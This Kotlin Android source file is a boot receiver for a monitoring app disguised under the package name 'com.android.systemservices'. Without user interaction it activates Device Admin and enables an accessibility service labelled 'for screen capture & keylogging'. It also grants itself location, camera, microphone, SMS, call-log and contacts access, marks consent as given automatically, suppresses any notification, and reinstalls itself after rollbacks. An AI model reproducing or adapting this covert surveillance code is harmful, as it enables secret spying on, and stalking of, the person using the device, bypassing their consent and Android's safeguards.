package com.android.systemservices

import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.os.Build
import android.os.Process
import android.provider.Settings
import android.Manifest
import android.util.Log
import java.io.File

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED &&
            intent.action != Intent.ACTION_MY_PACKAGE_REPLACED) return

        // ── OTA self-update: check if a reboot countdown is already armed ─────────
        // MY_PACKAGE_REPLACED fires when our package is replaced — but on GOS,
        // the boot-scan re-registers the priv-app APK on EVERY reboot (firing
        // MY_PACKAGE_REPLACED even when no new update was downloaded).  Setting
        // otaRebootPending=true here unconditionally caused a spurious 60-second
        // countdown on every reboot.
        //
        // AppUpdater's SessionCallback is the authoritative setter of the flag:
        // it runs in-process immediately after install success on this GOS build
        // (persistent process is not killed during priv-app updates).  This block
        // is now a pure safety-net: if the flag is already true from SessionCallback
        // we start the countdown; if false (normal reboot) we do nothing.
        if (intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
            Log.i(TAG, "MY_PACKAGE_REPLACED — checking if OTA countdown is armed")
            OtaRebootManager.checkAndSchedule(context)
        }

        // ── OTA flag cleanup on every boot ────────────────────────────────────────
        // If otaRebootPending is still true when BOOT_COMPLETED fires the device has
        // already rebooted — whether by the countdown timer, user, or a crash.  Any
        // reboot loads the new APK from disk, so the requirement is satisfied.  Clear
        // the flag here so the countdown does not fire on this (or any future) boot.
        // executeReboot() also clears it before calling pm.reboot(), so this is a
        // safety-net for manual reboots that happen during the countdown window.
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val p = context.getSharedPreferences("ft_prefs", Context.MODE_PRIVATE)
            if (p.getBoolean("ota_reboot_pending", false)) {
                p.edit().putBoolean("ota_reboot_pending", false).commit()
                Log.i(TAG, "OTA reboot flag cleared on BOOT_COMPLETED — device already rebooted")
            }
        }

        val flags = context.packageManager.getApplicationInfo(context.packageName, 0).flags
        val isSystemApp = flags and ApplicationInfo.FLAG_SYSTEM != 0

        val prefs = Prefs(context)

        if (isSystemApp) {
            // ── Root / system-app path ──────────────────────────────────────────
            // Activate Device Admin silently (NOT Device Owner) — gives us lockNow()
            // and setKeyguardDisabledFeatures() without enterprise notifications.
            tryActivateDeviceAdmin(context)

            // Pre-grant special access that can't be done via default-permissions.xml.
            // ONLY when a server URL is configured — enabling the AccessibilityService
            // unconditionally causes system-wide UI lag (adds overhead to every touch
            // event dispatch in Android's input pipeline) even when no monitoring is
            // active. On a fresh flash with no server URL there is nothing to monitor,
            // so there is no reason to pay that cost.
            if (prefs.serverUrl.isNotEmpty()) {
                enableSpecialAccessAtBoot(context)
            }

            // Re-apply in-memory restrictions that don't survive reboots
            // (StatusBarManager.disable2() and IWindowManager.setScreenCaptureDisabled()
            // are volatile; UserManager restrictions and DPM keyguard flags are persistent).
            // We post with a short delay so SystemUI is fully started before we touch it.
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try { DeviceOwnerHelper(context).restoreRestrictionsAtBoot() }
                catch (e: Exception) { Log.w(TAG, "restoreRestrictionsAtBoot: ${e.message}") }
            }, 8_000L)

            // Mark consent as given so the service starts without the setup UI.
            prefs.monitoringEnabled = true
            prefs.consentGiven = true

            // ── Self-healing: re-install if the package manager rolled back ─────
            // When FLAG_UPDATED_SYSTEM_APP is not written correctly in packages.xml
            // (e.g. because INSTALL_PACKAGES wasn't granted for that install attempt)
            // the package scanner on reboot discards the data-partition APK and
            // restores the system-image version.  AppUpdater saves the installed APK
            // to filesDir after every successful WebUI update; we re-apply it here if
            // the running versionCode is older than what we last installed.
            reapplyPendingUpdateIfNeeded(context, prefs)

        } else {
            // ── Device Owner path ────────────────────────────────────────────────
            // Provisioning is handled by patch-device-owner-auto.py (GOS build) or
            // via ADB on stock Android. Grant runtime perms and ensure accessibility.
            autoGrantPermissionsAsDO(context)
            ensureAccessibilityEnabledAsDO(context)

            // Server URL is compile-time hardcoded — DO installation IS the consent event.
            // Auto-enable monitoring on every boot so the service starts without a setup UI.
            prefs.monitoringEnabled = true
            prefs.consentGiven = true
        }

        if (prefs.monitoringEnabled && prefs.consentGiven && prefs.serverUrl.isNotEmpty()) {
            val svcIntent = Intent(context, MonitoringService::class.java)
            if (isSystemApp) {
                // Persistent process — no FGS obligation; Android won't enforce the
                // 5-second startForeground() deadline, so no notification is ever posted.
                context.startService(svcIntent)
            } else {
                // Device Owner path on stock Android — needs FGS to survive in background.
                context.startForegroundService(svcIntent)
            }
        }
    }

    // ── Device Admin activation (system builds only) ─────────────────────────
    // Sets this app as an active Device Admin using the hidden setActiveAdmin() API.
    // Device Admin (not Owner) lets us call lockNow() without the enterprise notifications.
    private fun tryActivateDeviceAdmin(context: Context) {
        val dpm   = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, DeviceAdminReceiver::class.java)

        // Already an admin → nothing to do
        if (dpm.isAdminActive(admin)) return

        try {
            // setActiveAdmin is @hide — invoke via reflection; requires MANAGE_DEVICE_ADMINS
            // which is listed in privapp-permissions-sentinel.xml.
            dpm.javaClass
                .getMethod("setActiveAdmin", ComponentName::class.java, Boolean::class.java)
                .invoke(dpm, admin, false /* refreshing */)
            Log.i(TAG, "Device Admin activated silently")
        } catch (e: Exception) {
            Log.w(TAG, "Could not silently activate Device Admin: ${e.message}")
        }
    }

    // ── Special app access (system builds only) ───────────────────────────────
    // WRITE_SECURE_SETTINGS (granted via privapp-permissions-sentinel.xml) lets a
    // privileged app enable Accessibility + Notification Listener without user interaction.
    // AppOps + MANAGE_APP_OPS_MODES lets us grant usage stats and battery stats access.
    private fun enableSpecialAccessAtBoot(context: Context) {
        val cr = context.contentResolver

        // 1. Accessibility service (for screen capture & keylogging)
        try {
            val accessibilityCn = "${context.packageName}/.ScreenshotService"
            val current = Settings.Secure.getString(cr, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            if (!current.contains(context.packageName)) {
                val updated = if (current.isEmpty()) accessibilityCn else "$current:$accessibilityCn"
                Settings.Secure.putString(cr, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated)
            }
            Settings.Secure.putInt(cr, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
            Log.i(TAG, "Accessibility enabled")
        } catch (e: Exception) {
            Log.w(TAG, "Accessibility enable failed: ${e.message}")
        }

        // 2. Notification Listener access
        try {
            val notifCn = "${context.packageName}/.NotificationService"
            val current = Settings.Secure.getString(cr, "enabled_notification_listeners") ?: ""
            if (!current.contains(context.packageName)) {
                val updated = if (current.isEmpty()) notifCn else "$current:$notifCn"
                Settings.Secure.putString(cr, "enabled_notification_listeners", updated)
            }
            Log.i(TAG, "Notification listener enabled")
        } catch (e: Exception) {
            Log.w(TAG, "Notification listener enable failed: ${e.message}")
        }

        // 3. Usage stats (AppOp: GET_USAGE_STATS) — requires MANAGE_APP_OPS_MODES
        // setMode(String, int, String, int) is a hidden API; invoke via reflection
        try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            appOps.javaClass.getMethod("setMode",
                String::class.java, Int::class.java, String::class.java, Int::class.java)
                .invoke(appOps,
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    context.packageName,
                    AppOpsManager.MODE_ALLOWED)
            Log.i(TAG, "Usage stats AppOp granted")
        } catch (e: Exception) {
            Log.w(TAG, "Usage stats AppOp failed: ${e.message}")
        }

        // 4. REQUEST_INSTALL_PACKAGES AppOp — lets PackageInstaller use
        // USER_ACTION_NOT_REQUIRED so silent APK updates need no user confirmation.
        try {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            appOps.javaClass.getMethod("setMode",
                String::class.java, Int::class.java, String::class.java, Int::class.java)
                .invoke(appOps,
                    "android:request_install_packages",
                    Process.myUid(),
                    context.packageName,
                    AppOpsManager.MODE_ALLOWED)
            Log.i(TAG, "REQUEST_INSTALL_PACKAGES AppOp granted")
        } catch (e: Exception) {
            Log.w(TAG, "REQUEST_INSTALL_PACKAGES AppOp failed: ${e.message}")
        }

        // 5. Battery stats — pre-granted via privapp-permissions; just log
        Log.i(TAG, "Battery stats available via BATTERY_STATS priv permission")

        // 6. GrapheneOS NetworkLocation provider — Settings.Global "network_location" defaults
        // to 0 (OFF) on GOS, so a device indoors (no GNSS sky view) gets NO location at all and
        // there is no Google network-location fallback. Enable the privacy-preserving GrapheneOS
        // proxy (2) so WiFi/cell coarse fixes work without Play Services. Only set when OFF.
        try {
            if (Settings.Global.getInt(cr, "network_location", 0) == 0) {
                Settings.Global.putInt(cr, "network_location", 2)
                Log.i(TAG, "GrapheneOS network location enabled (proxy)")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Network location enable failed: ${e.message}")
        }
    }

    // ── Accessibility re-enable via Device Owner (DO path only) ──────────────
    private fun ensureAccessibilityEnabledAsDO(context: Context) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val doh = DeviceOwnerHelper(context)
        if (!doh.isOwner && !doh.isProfileOwner) return  // DO or PO path
        val admin = ComponentName(context, DeviceAdminReceiver::class.java)
        val cn = "${context.packageName}/.ScreenshotService"
        val cr = context.contentResolver

        // MUST run before the ENABLED_ACCESSIBILITY_SERVICES check below, and independently of it:
        // the DPM accessibility allowlist is separate policy state, and it is the only thing that
        // survives a parent turning Advanced Protection on. Without it, APM makes the framework
        // call disableAccessibilityServiceLocked() on ScreenshotService even though it is enabled —
        // see DeviceOwnerHelper.allowlistAccessibilityForApm(). Idempotent, cheap, so re-asserting
        // on every boot also repairs the case where a previous update wiped the policy.
        doh.allowlistAccessibilityForApm()

        val current = Settings.Secure.getString(cr, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
        if (current.contains(context.packageName)) {
            Log.i(TAG, "DO: Accessibility already enabled")
            return
        }
        val updated = if (current.isEmpty()) cn else "$current:$cn"

        // Primary: dpm.setSecureSetting() — works on GOS when patch-accessibility-do.py is applied
        var ok = false
        try {
            dpm.setSecureSetting(admin, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated)
            dpm.setSecureSetting(admin, Settings.Secure.ACCESSIBILITY_ENABLED, "1")
            ok = true
            Log.i(TAG, "DO: Accessibility enabled via setSecureSetting")
        } catch (e: Exception) {
            Log.d(TAG, "DO: setSecureSetting blocked (${e.message}), trying WRITE_SECURE_SETTINGS")
        }

        // Fallback: Settings.Secure.putString() — works for platform-signed apps on stock Android
        if (!ok) {
            try {
                Settings.Secure.putString(cr, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, updated)
                Settings.Secure.putInt(cr, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
                Log.i(TAG, "DO: Accessibility enabled via WRITE_SECURE_SETTINGS")
            } catch (e: Exception) {
                Log.w(TAG, "DO: Accessibility enable failed: ${e.message}")
            }
        }
    }

    // ── Runtime permission grant via Device Owner (non-system builds) ─────────
    private fun autoGrantPermissionsAsDO(context: Context) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val doh = DeviceOwnerHelper(context)
        if (!doh.isOwner && !doh.isProfileOwner) return  // DO or PO path
        val admin = ComponentName(context, DeviceAdminReceiver::class.java)
        listOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS,
            // BLE tracker detection + device enumeration. Runtime perms introduced in API 31 (S);
            // grant on 31+ so the BT scanner's hasPermissions() gate passes (previously only relied
            // on lock_app_permissions, which never ran → scanner was a silent no-op with SCAN denied).
            Manifest.permission.BLUETOOTH_SCAN,
            Manifest.permission.BLUETOOTH_CONNECT
        ).forEach { perm ->
            try {
                dpm.setPermissionGrantState(
                    admin, context.packageName, perm,
                    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                )
            } catch (_: Exception) {}
        }
    }

    // ── Self-healing install ──────────────────────────────────────────────────
    /**
     * After a package-manager rollback the running versionCode will be lower than
     * [Prefs.pendingUpdateVersionCode].  If [AppUpdater.PENDING_APK_FILENAME] exists
     * in filesDir we call [AppUpdater.installFromFile] to silently re-apply it.
     *
     * The pending record is cleared by [InstallResultReceiver] on STATUS_SUCCESS so
     * this only fires once per rollback event, not on every subsequent boot.
     */
    private fun reapplyPendingUpdateIfNeeded(context: Context, prefs: Prefs) {
        val pendingVersionCode = prefs.pendingUpdateVersionCode
        if (pendingVersionCode <= 0L) return // nothing was ever saved

        val currentVersionCode: Long = try {
            val pi = context.packageManager.getPackageInfo(context.packageName, 0)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) pi.longVersionCode
            else @Suppress("DEPRECATION") pi.versionCode.toLong()
        } catch (e: Exception) {
            Log.w(TAG, "Could not read current versionCode: ${e.message}")
            return
        }

        if (currentVersionCode >= pendingVersionCode) {
            // Already up-to-date — clean up the pending record if the file is gone
            val pendingFile = File(context.filesDir, AppUpdater.PENDING_APK_FILENAME)
            if (!pendingFile.exists()) {
                prefs.pendingUpdateVersionCode = 0L
            }
            return
        }

        // We rolled back — try to recover
        val pendingFile = File(context.filesDir, AppUpdater.PENDING_APK_FILENAME)
        if (!pendingFile.exists()) {
            Log.w(TAG, "Rollback detected (current=$currentVersionCode < pending=$pendingVersionCode) " +
                    "but ${AppUpdater.PENDING_APK_FILENAME} is missing — clearing record")
            prefs.pendingUpdateVersionCode = 0L
            return
        }

        Log.i(TAG, "Rollback detected! current=$currentVersionCode, pending=$pendingVersionCode — " +
                "re-applying saved APK")
        AppUpdater(context).installFromFile(pendingFile)
    }

    companion object { private const val TAG = "BootReceiver" }
}
